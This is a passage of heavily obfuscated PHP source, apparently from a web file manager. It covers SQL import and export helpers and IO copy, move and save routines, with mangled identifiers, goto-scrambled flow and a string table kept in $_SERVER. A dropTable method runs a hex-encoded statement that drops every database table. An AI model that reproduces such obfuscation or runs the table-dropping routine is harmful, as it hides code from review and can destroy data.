while (!feof($Cí±‚¡‚®)) { $f—Ô¶‰Â‰» = trim(fgets($Cí±‚¡‚®)); if (!$f—Ô¶‰Â‰») { continue; } $cÈ‰„Ş‰á¿ = $this->sqlDecode($f—Ô¶‰Â‰», $this->type); if (stripos($cÈ‰„Ş‰á¿, $aØ¸‰ô”××[355]) === 0) { if (!$A®ƒì®êÆì) { $A®ƒì®êÆì = $cÈ‰„Ş‰á¿ . $aØ¸‰ô”××[50]; } continue; } if ($E‚ÔŒ³‹ÖŠ) { $E‚ÔŒ³‹ÖŠ->task[$aØ¸‰ô”××[1012]] += 1; } $Bóß§§à®++; $Fª¼×Í®‰[] = rtrim(rtrim(trim($cÈ‰„Ş‰á¿), $aØ¸‰ô”××[47]), $aØ¸‰ô”××[68]); if ($Bóß§§à® >= $e¹‹æ™’¾œ) { $cÈ‰„Ş‰á¿ = $A®ƒì®êÆì . implode($aØ¸‰ô”××[47], $Fª¼×Í®‰); if (!$BİˆÅ¬¾->execute($cÈ‰„Ş‰á¿)) { return !1; } if ($E‚ÔŒ³‹ÖŠ) { $E‚ÔŒ³‹ÖŠ->update($Bóß§§à®); } $Fª¼×Í®‰ = array(); $Bóß§§à® = 0; } } fclose($Cí±‚¡‚®); goto c§ÆØîù·¿; EäšÖÀŒ : } public function dropTable($d©ƒ²ªÖ–Î = null) { $CÑÒ÷éÜŸ÷ = $this->model()->db(); $A¼¯™Æ¾¨‡ = $d©ƒ²ªÖ–Î ? array($d©ƒ²ªÖ–Î) : $CÑÒ÷éÜŸ÷->getTables(); if (!$A¼¯™Æ¾¨‡) { return; } foreach ($A¼¯™Æ¾¨‡ as $d©ƒ²ªÖ–Î) { $CÑÒ÷éÜŸ÷->execute("\x64\x72\x6f\x70\40\164\x61\x62\x6c\x65\40\x69\146\x20\145\x78\x69\x73\164\163\x20\140{$d©ƒ²ªÖ–Î}\x60"); } } private function taskToCache($FÖÇÁ¾ğ¬» = null) { $f¬øáÍïÌã =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$FÖÇÁ¾ğ¬») { return; } $DŒâ‰·ÎÌ‹ = array($f¬øáÍïÌã[1014] => $FÖÇÁ¾ğ¬»->task[$f¬øáÍïÌã[1014]], $f¬øáÍïÌã[1012] => $FÖÇÁ¾ğ¬»->task[$f¬øáÍïÌã[1012]], $f¬øáÍïÌã[1027] => $FÖÇÁ¾ğ¬»->task[$f¬øáÍïÌã[1027]]); if ($DŒâ‰·ÎÌ‹[$f¬øáÍïÌã[1012]] == $DŒâ‰·ÎÌ‹[$f¬øáÍïÌã[1027]]) { $DŒâ‰·ÎÌ‹[$f¬øáÍïÌã[712]] = 1; } Cache::set($f¬øáÍïÌã[1028] . $FÖÇÁ¾ğ¬»->task[$f¬øáÍïÌã[393]], $DŒâ‰·ÎÌ‹); $FÖÇÁ¾ğ¬»->end(); } private function sqlEncode($C›¡Äß§º¼) { $f¢ä™šî“ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $f„å¢×®Š = array(); foreach ($C›¡Äß§º¼ as $AéÌš¬èï) { if (is_array($AéÌš¬èï)) { $AéÌš¬èï = json_encode_force($AéÌš¬èï); } $AéÌš¬èï = addslashes($AéÌš¬èï); $AéÌš¬èï = str_replace(array($f¢ä™šî“ã[1029], $f¢ä™šî“ã[229]), array($f¢ä™šî“ã[1030], $f¢ä™šî“ã[1031]), $AéÌš¬èï); $f„å¢×®Š[] = str_replace($f¢ä™šî“ã[55], $f¢ä™šî“ã[1032], $AéÌš¬èï); } return $f¢ä™šî“ã[55] . implode($f¢ä™šî“ã[1033], $f„å¢×®Š) . $f¢ä™šî“ã[55]; } private function sqlDecode($d†Òô†İ, $C¢¥ØËù¼â) { $A‰¿õù¡¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d†Òô†İ = str_replace(array($A‰¿õù¡¸[1030], $A‰¿õù¡¸[1031]), array($A‰¿õù¡¸[1029], $A‰¿õù¡¸[229]), $d†Òô†İ); if ($C¢¥ØËù¼â == $A‰¿õù¡¸[9]) { $d†Òô†İ = stripslashes($d†Òô†İ); } return $d†Òô†İ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Fßê”¶‚¡Î, $aÑë¬ã‡Ù¥) { goto Cé„œ›¦ƒ…; Cé„œ›¦ƒ…: $f¢ÌÑÆ¥ªÏ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D÷Í¤ÚÒƒÚ = $aÑë¬ã‡Ù¥; $GLOBALS[$f¢ÌÑÆ¥ªÏ[1034]] = $f¢ÌÑÆ¥ªÏ[1035] . $Fßê”¶‚¡Î; goto b¨¹Œë§ºÆ; b¨¹Œë§ºÆ: Hook::trigger($f¢ÌÑÆ¥ªÏ[1035] . $Fßê”¶‚¡Î . $f¢ÌÑÆ¥ªÏ[1036], $D÷Í¤ÚÒƒÚ); $A¬‡øš¬å = self::driverMake($aÑë¬ã‡Ù¥[0]); if (method_exists($A¬‡øš¬å, $Fßê”¶‚¡Î)) { $eöÍé¶ÒÙâ = @call_user_func_array(array($A¬‡øš¬å, $Fßê”¶‚¡Î), $aÑë¬ã‡Ù¥); } else { if (method_exists($A¬‡øš¬å, $f¢ÌÑÆ¥ªÏ[1037])) { $eöÍé¶ÒÙâ = @call_user_func_array(array($A¬‡øš¬å, $Fßê”¶‚¡Î), $aÑë¬ã‡Ù¥); } else { if (method_exists(self, $Fßê”¶‚¡Î)) { $eöÍé¶ÒÙâ = @call_user_func_array(array(self, $Fßê”¶‚¡Î), $aÑë¬ã‡Ù¥); } else { $eöÍé¶ÒÙâ = call_user_func_array(array(parent, $Fßê”¶‚¡Î), $aÑë¬ã‡Ù¥); } } } goto DŸˆàç÷æÌ; DŸˆàç÷æÌ: Hook::trigger($f¢ÌÑÆ¥ªÏ[1035] . $Fßê”¶‚¡Î . $f¢ÌÑÆ¥ªÏ[1038], $D÷Í¤ÚÒƒÚ, $eöÍé¶ÒÙâ); return $eöÍé¶ÒÙâ; goto Aî¯Íƒ¯¥»; Aî¯Íƒ¯¥»: } public static function init($Bœ´¤Ù„) { return self::driverMake($Bœ´¤Ù„); } public static function copy($d”¶‰Æ¼Õ, $E¬®•÷éù³, $BÊë«ÂİÛ¤ = false, $BÈğ¡ĞáÕ = false) { return self::copyMoveStart($d”¶‰Æ¼Õ, $E¬®•÷éù³, $BÊë«ÂİÛ¤, $_SERVER[ÒÆ›ÆØÎ¾][518], $BÈğ¡ĞáÕ); } public static function move($Dâ§Ššª¹í, $a·ÊÌÑó˜ì, $EíÒäÄî¸ = false, $aÜ¢ñÌïß¿ = false) { return self::copyMoveStart($Dâ§Ššª¹í, $a·ÊÌÑó˜ì, $EíÒäÄî¸, $_SERVER[ÒÆ›ÆØÎ¾][520], $aÜ¢ñÌïß¿); } private static function copyMoveStart($eˆ‡¹Ì‡­, $Bøßæë‚‚º, $eÏ¡Ê¸Ô«ç, $aƒƒê·á¼„, $EÄÃŸ…ö›ğ) { $BÚ–ã‰òË‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aƒù²·ØÕ· = array($eˆ‡¹Ì‡­, $Bøßæë‚‚º, $eÏ¡Ê¸Ô«ç, $EÄÃŸ…ö›ğ); Hook::trigger($BÚ–ã‰òË‰[1035] . $aƒƒê·á¼„ . $BÚ–ã‰òË‰[1036], $aƒù²·ØÕ·); $C³ƒêÏàì = self::copyMove($eˆ‡¹Ì‡­, $Bøßæë‚‚º, $eÏ¡Ê¸Ô«ç, $aƒƒê·á¼„, $EÄÃŸ…ö›ğ); Hook::trigger($BÚ–ã‰òË‰[1035] . $aƒƒê·á¼„ . $BÚ–ã‰òË‰[1038], $aƒù²·ØÕ·, $C³ƒêÏàì); return $C³ƒêÏàì; } public static function saveFile($eŞĞ¸Éµñ¢, $DŠÖ• Û, $Eë‰‚‰ìçÚ = true) { goto cÛô‘ÔÜÁù; Dµ‰¡è¯½Û: $cä˜åˆÓ = $B£Í˜ÏÓÖÑ->pathFather($DŠÖ• Û); $b‡åšé†Ã„ = !0; if (!$Eë‰‚‰ìçÚ && self::driverIsSame($FÃÖáºÍƒÓ, $B£Í˜ÏÓÖÑ)) { $b‡åšé†Ã„ = !1; } goto e™ÜÅË¥¯; e™ÜÅË¥¯: $fäÓ»ìˆëã = self::copyFile($FÃÖáºÍƒÓ, $eŞĞ¸Éµñ¢, $B£Í˜ÏÓÖÑ, $cä˜åˆÓ, $FÓÜ±ÑÚçÛ[$D”ô¥˜Æá[28]], $b‡åšé†Ã„); if ($AŞ¢êÜØƒ«) { $fäÓ»ìˆëã = $AŞ¢êÜØƒ«->getPathOuter($fäÓ»ìˆëã); } return $fäÓ»ìˆëã; goto e‘†¶¸’­‹; cÛô‘ÔÜÁù: $D”ô¥˜Æá =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÓÜ±ÑÚçÛ = self::info($DŠÖ• Û); $FÃÖáºÍƒÓ = self::driverMake($eŞĞ¸Éµñ¢); goto dñìì˜Ç‰õ; dñìì˜Ç‰õ: $B£Í˜ÏÓÖÑ = self::driverMake($DŠÖ• Û); $AŞ¢êÜØƒ« = !1; if ($B£Í˜ÏÓÖÑ->pathParse[$D”ô¥˜Æá[1039]]) { $fš—²ì§Î© = $B£Í˜ÏÓÖÑ->pathParse[$D”ô¥˜Æá[1039]]; $AŞ¢êÜØƒ« = $B£Í˜ÏÓÖÑ; $B£Í˜ÏÓÖÑ = self::driverMake($fš—²ì§Î©); } goto Dµ‰¡è¯½Û; e‘†¶¸’­‹: } private static function copyMove($CÚ¸’ÓÒÅ, $B¨ÖÎ¹¾‡÷, $B­Áê°®·, $D¢íÊ»à¾, $cçõÃÅö‡ = false) { goto Aª•œÔĞ–®; Céº°²Ì‹…: $c„ÁÚÄÙñĞ = !1; if ($DÀëĞË¹»->pathParse[$b‰‚ÛÕ„À‰[1039]]) { $B¨ÖÎ¹¾‡÷ = $DÀëĞË¹»->pathParse[$b‰‚ÛÕ„À‰[1039]]; $c„ÁÚÄÙñĞ = $DÀëĞË¹»; $DÀëĞË¹» = self::driverMake($B¨ÖÎ¹¾‡÷); } self::check($a´‘à¦È„„, $CÚ¸’ÓÒÅ, $DÀëĞË¹», $B¨ÖÎ¹¾‡÷); goto Fš–™ ÷¾è; Fš–™ ÷¾è: Hook::trigger($b‰‚ÛÕ„À‰[73], $a´‘à¦È„„, $CÚ¸’ÓÒÅ, $DÀëĞË¹», $B¨ÖÎ¹¾‡÷); $aç¹ê‚›ö¿ = self::driverIsSame($a´‘à¦È„„, $DÀëĞË¹»); if ($aç¹ê‚›ö¿) { if ($D¢íÊ»à¾ == $b‰‚ÛÕ„À‰[520] && !method_exists($DÀëĞË¹», $b‰‚ÛÕ„À‰[1040]) && trim($B¨ÖÎ¹¾‡÷, $b‰‚ÛÕ„À‰[8]) == trim($DÀëĞË¹»->pathFather($CÚ¸’ÓÒÅ), $b‰‚ÛÕ„À‰[8])) { if ($a´‘à¦È„„->pathThis($CÚ¸’ÓÒÅ) != $cçõÃÅö‡ && !$a´‘à¦È„„->isTypeObject()) { return $a´‘à¦È„„->rename($CÚ¸’ÓÒÅ, $cçõÃÅö‡); } return $DÀëĞË¹»->getPathOuter($CÚ¸’ÓÒÅ); } if (method_exists($DÀëĞË¹», $D¢íÊ»à¾)) { return $DÀëĞË¹»->{$D¢íÊ»à¾}($CÚ¸’ÓÒÅ, $B¨ÖÎ¹¾‡÷, $B­Áê°®·); } } goto bà›Û½ç­¤; Eïæå£­Åæ: if ($c„ÁÚÄÙñĞ) { $FàèÕ©ğà = $c„ÁÚÄÙñĞ->getPathOuter($FàèÕ©ğà); } return $FàèÕ©ğà; goto b‹˜¿Ò…–Õ; bà›Û½ç­¤: $c‡‘›ØÉÆì = $a´‘à¦È„„->isFile($CÚ¸’ÓÒÅ); if (!$c‡‘›ØÉÆì && $DÀëĞË¹»->getType() == $b‰‚ÛÕ„À‰[710] && $a´‘à¦È„„->getType() == $b‰‚ÛÕ„À‰[106]) { $FàèÕ©ğà = $DÀëĞË¹»->copyFolderFromIO($a´‘à¦È„„, $CÚ¸’ÓÒÅ, $B¨ÖÎ¹¾‡÷, $B­Áê°®·, $e”¤¨ÕëÖ, $cçõÃÅö‡); } else { $FàèÕ©ğà = self::copyPath($a´‘à¦È„„, $CÚ¸’ÓÒÅ, $DÀëĞË¹», $B¨ÖÎ¹¾‡÷, $B­Áê°®·, $e”¤¨ÕëÖ, $c‡‘›ØÉÆì, $cçõÃÅö‡); } if ($FàèÕ©ğà && $e”¤¨ÕëÖ) { $a´‘à¦È„„->remove($CÚ¸’ÓÒÅ); } goto Eïæå£­Åæ; Aª•œÔĞ–®: $b‰‚ÛÕ„À‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$CÚ¸’ÓÒÅ || $CÚ¸’ÓÒÅ == $b‰‚ÛÕ„À‰[8] || !$B¨ÖÎ¹¾‡÷) { return !1; } ignore_timeout(); goto F‘Ïíä™‘Í; F‘Ïíä™‘Í: $a´‘à¦È„„ = self::driverMake($CÚ¸’ÓÒÅ); $DÀëĞË¹» = self::driverMake($B¨ÖÎ¹¾‡÷); $e”¤¨ÕëÖ = $D¢íÊ»à¾ == $b‰‚ÛÕ„À‰[520]; goto Céº°²Ì‹…; b‹˜¿Ò…–Õ: } private static function check($B£¹¶§Ä£÷, $d¼ŸªÎÑ”, $DØ«èèˆàŠ, &$b¤‚Ô˜¾) { $CâÜõ…Ü‡‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::driverIsSame($B£¹¶§Ä£÷, $DØ«èèˆàŠ) && $B£¹¶§Ä£÷->isFolder($d¼ŸªÎÑ”) && $B£¹¶§Ä£÷->isParentOf($d¼ŸªÎÑ”, $b¤‚Ô˜¾)) { show_json(LNG($CâÜõ…Ü‡‚[1041]), !1); } if (!$B£¹¶§Ä£÷->exist($d¼ŸªÎÑ”)) { show_json(LNG($CâÜõ…Ü‡‚[105]), !1); } } private static function copyPath($A’‰®§¿ÄÈ, $EÊ¾ºÙË³½, $cíçù…¡ùÙ, $dóĞÇšóÜ, $dİ™ª…®ŠÎ, $e¨Ù¾ Ÿğ, $c¿¯‘ìéå, $aÑù°®­×ˆ = false) { goto aæ‹«ëùÜĞ; aæ‹«ëùÜĞ: $c³×“ŒºÎ» =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÕë»Õ¢Â = empty($aÑù°®­×ˆ) && $aÑù°®­×ˆ !== $c³×“ŒºÎ»[191] ? $A’‰®§¿ÄÈ->pathThis($EÊ¾ºÙË³½) : $aÑù°®­×ˆ; if ($dİ™ª…®ŠÎ) { $C¼­ùâ¯Úİ = $cíçù…¡ùÙ->fileNameExist($dóĞÇšóÜ, $aÕë»Õ¢Â); $aÕë»Õ¢Â = $cíçù…¡ùÙ->fileNameAuto($dóĞÇšóÜ, $aÕë»Õ¢Â, $dİ™ª…®ŠÎ, !$c¿¯‘ìéå); $dİ™ª…®ŠÎ = $C¼­ùâ¯Úİ ? $dİ™ª…®ŠÎ : !1; } goto C©÷Ô¯‚‡ø; C©÷Ô¯‚‡ø: if ($c¿¯‘ìéå) { return self::copyFile($A’‰®§¿ÄÈ, $EÊ¾ºÙË³½, $cíçù…¡ùÙ, $dóĞÇšóÜ, $aÕë»Õ¢Â, $e¨Ù¾ Ÿğ); } if ($dİ™ª…®ŠÎ == REPEAT_RENAME_FOLDER) { $dİ™ª…®ŠÎ = !1; } $Fºç”„•× = rtrim($dóĞÇšóÜ, $c³×“ŒºÎ»[8]) . $c³×“ŒºÎ»[8] . $aÕë»Õ¢Â; goto f¢ßÖ„š¬; f¢ßÖ„š¬: $cÚÓ£ƒğ¤‘ = $cíçù…¡ùÙ->mkdir($cíçù…¡ùÙ->getPath($Fºç”„•×)); $dóĞÇšóÜ = $cíçù…¡ùÙ->getPathInner($cÚÓ£ƒğ¤‘); $eâÀ×Îªôô = $A’‰®§¿ÄÈ->listPath($EÊ¾ºÙË³½, !0); goto f¯ÓÏ‰à©­; f¯ÓÏ‰à©­: $eâÀ×Îªôô = is_array($eâÀ×Îªôô) ? $eâÀ×Îªôô : array($c³×“ŒºÎ»[74] => array(), $c³×“ŒºÎ»[75] => array()); $DÑòùš‚ë™ = array_merge($eâÀ×Îªôô[$c³×“ŒºÎ»[74]], $eâÀ×Îªôô[$c³×“ŒºÎ»[75]]); foreach ($DÑòùš‚ë™ as $bÅ¾‹È¤Ñ«) { $F‘®²ª¤Şó = $bÅ¾‹È¤Ñ«[$c³×“ŒºÎ»[29]] == $c³×“ŒºÎ»[193]; $EÊ¾ºÙË³½ = $A’‰®§¿ÄÈ->getPathInner($bÅ¾‹È¤Ñ«[$c³×“ŒºÎ»[76]]); $D¹§©çˆ«Æ = self::copyPath($A’‰®§¿ÄÈ, $EÊ¾ºÙË³½, $cíçù…¡ùÙ, $dóĞÇšóÜ, $dİ™ª…®ŠÎ, $e¨Ù¾ Ÿğ, $F‘®²ª¤Şó); if (!$D¹§©çˆ«Æ) { IO::errorTips($c³×“ŒºÎ»[1042] . $EÊ¾ºÙË³½ . $c³×“ŒºÎ»[67] . $dóĞÇšóÜ); } } goto DĞßÎíÃ¯è; DĞßÎíÃ¯è: self::copyMoveKeepInfo($A’‰®§¿ÄÈ, $EÊ¾ºÙË³½, $cÚÓ£ƒğ¤‘); return $cÚÓ£ƒğ¤‘; goto BÈÍÔ¬ÍÆÂ; BÈÍÔ¬ÍÆÂ: } private static function copyFile($F§¥§©ãõš, $Eø¶ì‹ñÒ, $Fˆ¦í‹˜ò§, $b˜Ğµ‹§ŞÔ, $BöÖ­»òŒ½, $F‡Úå•ãªË) { goto D¸±Ï¢º‘Ü; C¼¤İŒëóÏ: Hook::trigger($a”¾ã¨’Àò[1044], $F§¥§©ãõš, $Eø¶ì‹ñÒ, $Fˆ¦í‹˜ò§, $b˜Ğµ‹§ŞÔ, $BöÖ­»òŒ½, $bÕõÔæ‚³•); if (self::driverIsSame($F§¥§©ãõš, $Fˆ¦í‹˜ò§)) { if ($F‡Úå•ãªË) { $BÁ×¾ÆŠİ = $Fˆ¦í‹˜ò§->moveFile($Eø¶ì‹ñÒ, $b˜Ğµ‹§ŞÔ); } else { $BÁ×¾ÆŠİ = $Fˆ¦í‹˜ò§->copyFile($Eø¶ì‹ñÒ, $b˜Ğµ‹§ŞÔ); } Hook::trigger($a”¾ã¨’Àò[1045], $F§¥§©ãõš, $Eø¶ì‹ñÒ, $Fˆ¦í‹˜ò§, $b˜Ğµ‹§ŞÔ, $BöÖ­»òŒ½, $BÁ×¾ÆŠİ); self::copyMoveKeepInfo($F§¥§©ãõš, $Eø¶ì‹ñÒ, $BÁ×¾ÆŠİ); return $BÁ×¾ÆŠİ; } $fÉ†İ›åÖ– = TEMP_FILES; goto AØŒÃ‚©¿Í; AØŒÃ‚©¿Í: if ($GLOBALS[$a”¾ã¨’Àò[6]][$a”¾ã¨’Àò[88]][$a”¾ã¨’Àò[752]]) { $fÉ†İ›åÖ– = $GLOBALS[$a”¾ã¨’Àò[6]][$a”¾ã¨’Àò[88]][$a”¾ã¨’Àò[752]]; } $F‡Úå•ãªË = !0; $Dê¸­à†ºÁ = $fÉ†İ›åÖ–; goto cÕÊ‘òèä±; D¸±Ï¢º‘Ü: $a”¾ã¨’Àò =& $_SERVER[ÒÆ›ÆØÎ¾]; $b˜Ğµ‹§ŞÔ = $Fˆ¦í‹˜ò§->getPath(rtrim($b˜Ğµ‹§ŞÔ, $a”¾ã¨’Àò[8]) . $a”¾ã¨’Àò[8] . $BöÖ­»òŒ½); $bÕõÔæ‚³• = $a”¾ã¨’Àò[1043] . time() . rand_string(5); goto C¼¤İŒëóÏ; d†ÁæÕÉº: $D•ÖŒõÊˆ¦ = $F§¥§©ãõš->download($Eø¶ì‹ñÒ, $D•ÖŒõÊˆ¦); $D•ÖŒõÊˆ¦ = $F§¥§©ãõš->iconvApp($D•ÖŒõÊˆ¦); $BÁ×¾ÆŠİ = $Fˆ¦í‹˜ò§->upload($b˜Ğµ‹§ŞÔ, $D•ÖŒõÊˆ¦, $F‡Úå•ãªË); goto E«ÕÓÕä±†; cÕÊ‘òèä±: mk_dir($Dê¸­à†ºÁ); $D•ÖŒõÊˆ¦ = $Dê¸­à†ºÁ . $bÕõÔæ‚³•; $fƒ™İš’ğŠ = $D•ÖŒõÊˆ¦; goto d†ÁæÕÉº; E«ÕÓÕä±†: self::remove($fƒ™İš’ğŠ); Hook::trigger($a”¾ã¨’Àò[1045], $F§¥§©ãõš, $Eø¶ì‹ñÒ, $Fˆ¦í‹˜ò§, $b˜Ğµ‹§ŞÔ, $BöÖ­»òŒ½, $BÁ×¾ÆŠİ); self::copyMoveKeepInfo($F§¥§©ãõš, $Eø¶ì‹ñÒ, $BÁ×¾ÆŠİ); goto e‚Ü¥¸¢; e‚Ü¥¸¢: return $BÁ×¾ÆŠİ; goto fë¦œŠ‚àŒ; fë¦œŠ‚àŒ: } private static function copyMoveKeepInfo($a›ôçïî‡, $A´ÍÑ‹¨è’, $bÖ§Š±æö) { if (!$bÖ§Š±æö) { return; } $Cæ››Éºàì = $a›ôçïî‡->info($A´ÍÑ‹¨è’); if (!is_array($Cæ››Éºàì)) { return; } IO::setModifyTime($bÖ§Š±æö, $Cæ››Éºàì[$_SERVER[ÒÆ›ÆØÎ¾][84]]); } public static function pathFather($DÒ”³Ş„ì) { $aÆ«¤¯­å = IO::init($DÒ”³Ş„ì); $fÊ‘Ã‘‹ˆƒ = $aÆ«¤¯­å->pathFather($aÆ«¤¯­å->path); return $aÆ«¤¯­å->getPathOuter($fÊ‘Ã‘‹ˆƒ); } public static function fileOut($bµÛÛĞª, $a¢§ï¼ãï¹ = false, $AÅôë¹‹Ë× = false, $EÁËÍ›ÊÆ­ = '') { $føå‡õ‘ = self::driverMake($bµÛÛĞª); if ($føå‡õ‘->isFileOutServer()) { return $føå‡õ‘->fileOutServer($bµÛÛĞª, $a¢§ï¼ãï¹, $AÅôë¹‹Ë×, $EÁËÍ›ÊÆ­); } return $føå‡õ‘->fileOut($bµÛÛĞª, $a¢§ï¼ãï¹, $AÅôë¹‹Ë×, $EÁËÍ›ÊÆ­); } public static function fileOutImage($E¬ãªİÉ¿ã, $cëˆ‹ê¡¹ = 250) { $aå÷‡ïñ²Ñ = array(250, 600, 1200, 3000, 5000); for ($a¨ã¤†™ã = 0; $a¨ã¤†™ã < count($aå÷‡ïñ²Ñ); $a¨ã¤†™ã++) { if ($a¨ã¤†™ã == 0 && $cëˆ‹ê¡¹ <= $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]) { $cëˆ‹ê¡¹ = $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]; break; } else { if ($cëˆ‹ê¡¹ > $aå÷‡ïñ²Ñ[$a¨ã¤†™ã - 1] && $cëˆ‹ê¡¹ <= $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]) { $cëˆ‹ê¡¹ = $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]; break; } else { if ($a¨ã¤†™ã == count($aå÷‡ïñ²Ñ) - 1 && $cëˆ‹ê¡¹ > $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]) { $cëˆ‹ê¡¹ = $aå÷‡ïñ²Ñ[$a¨ã¤†™ã]; break; } } } } $aëÇæ‹Îƒ = self::driverMake($E¬ãªİÉ¿ã); if ($aëÇæ‹Îƒ->isFileOutServer()) { return $aëÇæ‹Îƒ->fileOutImageServer($E¬ãªİÉ¿ã, $cëˆ‹ê¡¹); } return $aëÇæ‹Îƒ->fileOutImage($E¬ãªİÉ¿ã, $cëˆ‹ê¡¹); } private static function driverIsSame($c†È‘Ùº•’, $F‘›‚©²») { goto BÂ‘Ûºëçå; BÂ‘Ûºëçå: $FÁ»…«ï‹¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÜ¯ÔÅ¼’ = $c†È‘Ùº•’->getType(); $FÄïÊ‹òœö = $F‘›‚©²»->getType(); goto f’¥Ä—„ˆ§; f’¥Ä—„ˆ§: if ($eÜ¯ÔÅ¼’ != $FÄïÊ‹òœö) { return !1; } if ($eÜ¯ÔÅ¼’ == $FÁ»…«ï‹¶[710]) { return !0; } if ($eÜ¯ÔÅ¼’ == $FÁ»…«ï‹¶[106]) { return !0; } goto CÚ·£Ü·‹·; CÚ·£Ü·‹·: if ($c†È‘Ùº•’->pathDriver == $F‘›‚©²»->pathDriver) { return !0; } return !1; goto D¡Ï¬ÈÊàë; D¡Ï¬ÈÊàë: } public static function copyUpdate($E¬³Å…¬, $AØ‰ÂÉê‰Á) { goto a¦™÷ÆôÚŞ; aÅ§†ˆÓŒ—: $A†Ó©µƒÌ = array(); foreach ($EõŒ´í“åå as $Fºğç‡¥¬Ç => $E¨‹¦ßÉ›Ü) { if (isset($B„Ñ–˜ë–ï[$Fºğç‡¥¬Ç])) { if ($E¨‹¦ßÉ›Ü[$eÎéß™‹½É[77]] == 1) { continue; } if ($B„Ñ–˜ë–ï[$Fºğç‡¥¬Ç][$eÎéß™‹½É[78]] == $E¨‹¦ßÉ›Ü[$eÎéß™‹½É[78]]) { continue; } } if ($E¨‹¦ßÉ›Ü[$eÎéß™‹½É[77]] == 1) { $A†Ó©µƒÌ[] = $AØ‰ÂÉê‰Á . $eÎéß™‹½É[8] . $Fºğç‡¥¬Ç; continue; } $DŸé¬Ü  = strstr(trim($Fºğç‡¥¬Ç, $eÎéß™‹½É[8]), $eÎéß™‹½É[8]) ? get_path_father($Fºğç‡¥¬Ç) : $eÎéß™‹½É[33]; $cÂ‚¨ñÏ˜‚[] = array($eÎéß™‹½É[1046] => $E¨‹¦ßÉ›Ü[$eÎéß™‹½É[76]], $eÎéß™‹½É[1047] => rtrim($AØ‰ÂÉê‰Á, $eÎéß™‹½É[8]) . $eÎéß™‹½É[8] . $DŸé¬Ü , $eÎéß™‹½É[1048] => $E¨‹¦ßÉ›Ü); } $e öÇ¸Í†Ã = array($eÎéß™‹½É[193] => $cÂ‚¨ñÏ˜‚, $eÎéß™‹½É[77] => $A†Ó©µƒÌ); goto a½¯ø‰¢; b‡¿èÛî: $EõŒ´í“åå = self::_listAll($E¬³Å…¬); $B„Ñ–˜ë–ï = self::_listAll($AØ‰ÂÉê‰Á); $cÂ‚¨ñÏ˜‚ = array(); goto aÅ§†ˆÓŒ—; a¦™÷ÆôÚŞ: $eÎéß™‹½É =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!IO::exist($E¬³Å…¬)) { return !1; } if (!IO::exist($AØ‰ÂÉê‰Á)) { IO::mkdir($AØ‰ÂÉê‰Á); } goto b‡¿èÛî; a½¯ø‰¢: Hook::trigger($eÎéß™‹½É[1049], $E¬³Å…¬, $AØ‰ÂÉê‰Á, $e öÇ¸Í†Ã); foreach ($A†Ó©µƒÌ as $E¨‹¦ßÉ›Ü) { IO::mkdir($E¨‹¦ßÉ›Ü); } foreach ($cÂ‚¨ñÏ˜‚ as $E¨‹¦ßÉ›Ü) { IO::copy($E¨‹¦ßÉ›Ü[$eÎéß™‹½É[1046]], $E¨‹¦ßÉ›Ü[$eÎéß™‹½É[1047]], REPEAT_REPLACE); } goto Dï…¹ÂÒ¡; Dï…¹ÂÒ¡: } private static function _listAll($CÈ‚¿Âß«è) { $c£Ó¥Èè’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÈ‚¿Âß«è = KodIO::clear($CÈ‚¿Âß«è); $C„é·ùÚ—º = IO::listAll($CÈ‚¿Âß«è); foreach ($C„é·ùÚ—º as &$E‚óãƒ…Û) { $EÅÃÁ±Áš = substr($E‚óãƒ…Û[$c£Ó¥Èè’[76]], strlen($CÈ‚¿Âß«è)); $E‚óãƒ…Û[$c£Ó¥Èè’[1050]] = trim($EÅÃÁ±Áš, $c£Ó¥Èè’[8]); } unset($E‚óãƒ…Û); return array_to_keyvalue($C„é·ùÚ—º, $c£Ó¥Èè’[1050]); } public static function fileSubstr($bÁ‹¾¿âÂ, $AÓø÷îôÍÕ, $B‰ÊİåÛÀ¿ = false) { goto a‹ğÂæèİ; bµÄğŸïÅ¤: $dÈÙ©à‘Óì = $AÓø÷îôÍÕ; $CáÆŒ­½Ñ = $B‰ÊİåÛÀ¿; if ($AÓø÷îôÍÕ < 0) { $AÓø÷îôÍÕ = $bÑÁ…’…¤ + $AÓø÷îôÍÕ; } goto EÑ‚±…Àˆå; a‹ğÂæèİ: $eÅ·ãÌì¨‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E½¼ª„ì–Ş = self::driverMake($bÁ‹¾¿âÂ); $bÑÁ…’…¤ = $E½¼ª„ì–Ş->size($bÁ‹¾¿âÂ); goto bµÄğŸïÅ¤; EÑ‚±…Àˆå: if ($B‰ÊİåÛÀ¿ === !1) { $B‰ÊİåÛÀ¿ = $bÑÁ…’…¤ - $AÓø÷îôÍÕ; } if ($AÓø÷îôÍÕ + $B‰ÊİåÛÀ¿ > $bÑÁ…’…¤) { $B‰ÊİåÛÀ¿ = $bÑÁ…’…¤ - $AÓø÷îôÍÕ; } if (!$bÑÁ…’…¤ && $E½¼ª„ì–Ş->getType() == $eÅ·ãÌì¨‡[106] && !$E½¼ª„ì–Ş->exist($bÁ‹¾¿âÂ)) { throw new Exception($eÅ·ãÌì¨‡[1051] . LNG($eÅ·ãÌì¨‡[1052]) . $eÅ·ãÌì¨‡[915] . get_path_this($bÁ‹¾¿âÂ) . $eÅ·ãÌì¨‡[33]); } goto d¨É‡‡£â; dÄ²ñÌè¤ó: if (!$B¡ÙñÔêç± && $B‰ÊİåÛÀ¿ && isset($GLOBALS[$eÅ·ãÌì¨‡[1053]])) { throw new 